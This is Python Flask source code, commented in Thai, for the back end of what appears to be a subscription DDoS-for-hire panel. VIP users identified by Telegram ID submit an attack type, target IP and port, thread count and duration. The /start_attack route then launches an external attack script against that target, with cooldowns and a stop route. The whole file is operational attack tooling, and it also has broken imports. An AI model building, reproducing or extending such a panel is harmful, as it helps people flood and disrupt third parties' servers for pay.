from flask import Flask, render_template, request, jsonify
import sqlite3
from datetime import datetime, timedelta
import subprocess
import time

app = Flask(__name__)

# ตั้งค่าฐข้อมูล
ADMIN_ID = 999
START_PY_PATH = "start.py"
cooldowns = {}
active_attacks = {}

# เชื่อมต่อฐานข้อมูล SQLite
def get_db_connection():
    conn = sqlite3.connect("users.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

# สร้างตาราง VIP Users ถ้ายังไม่มี
def init_db():
    conn = get_db_connection()
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS vip_users (
            id INTEGER PRIMARY KEY,
            telegram_id INTEGER UNIQUE,
            expiration_date TEXT
        )
        """
    )
    conn.commit()
    conn.close()

init_db()

# หน้าแรก
@app.route("/")
def index():
    return send_from_directory(os.getcwd(), 'index.html')

# ตรวจสอบสถานะ VIP
@app.route("/check_vip", methods=["POST"])
def check_vip():
    user_id = int(request.form["user_id"])
    conn = get_db_connection()
    result = conn.execute(
        "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
        (user_id,),
    ).fetchone()
    conn.close()

    if result:
        expiration_date = datetime.strptime(result["expiration_date"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            return jsonify({"status": "expired", "message": "VIP ของคุณหมดอายุแล้ว!"})
        else:
            days_remaining = (expiration_date - datetime.now()).days
            return jsonify(
                {
                    "status": "active",
                    "message": f"VIP ของคุณเหลือ {days_remaining} วัน",
                }
            )
    else:
        return jsonify({"status": "inactive", "message": "คุณไม่มีสิทธิ์ VIP!"})

# เริ่มการโจมตี
@app.route("/start_attack", methods=["POST"])
def start_attack():
    user_id = int(request.form["user_id"])
    attack_type = request.form["type"]
    ip_port = request.form["ip_port"]
    threads = request.form["threads"]
    duration = request.form["duration"]

    # ตรวจสอบสิทธิ์ VIP
    conn = get_db_connection()
    result = conn.execute(
        "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
        (user_id,),
    ).fetchone()
    conn.close()

    if not result:
        return jsonify({"status": "error", "message": "คุณไม่มีสิทธิ์ใช้คำสั่งนี้!"})

    expiration_date = datetime.strptime(result["expiration_date"], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        return jsonify({"status": "error", "message": "VIP ของคุณหมดอายุแล้ว!"})

    if user_id in cooldowns and time.time() - cooldowns[user_id] < 10:
        return jsonify({"status": "error", "message": "โปรดรอ 10 วินาทีก่อนเริ่มการโจมตีใหม่!"})

    # เริ่มการโจมตี
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[user_id] = process
    cooldowns[user_id] = time.time()

    return jsonify({"status": "success", "message": "การโจมตีเริ่มต้นแล้ว!"})

# หยุดการโจมตี
@app.route("/stop_attack", methods=["POST"])
def stop_attack():
    user_id = int(request.form["user_id"])
    if user_id in active_attacks:
        process = active_attacks[user_id]
        process.terminate()
        del active_attacks[user_id]
        return jsonify({"status": "success", "message": "หยุดการโจมตีเรียบร้อยแล้ว!"})
    else:
        return jsonify({"status": "error", "message": "ไม่พบการโจมตีที่กำลังทำงานอยู่!"})

if __name__ == "__main__":
    app.run(debug=True)
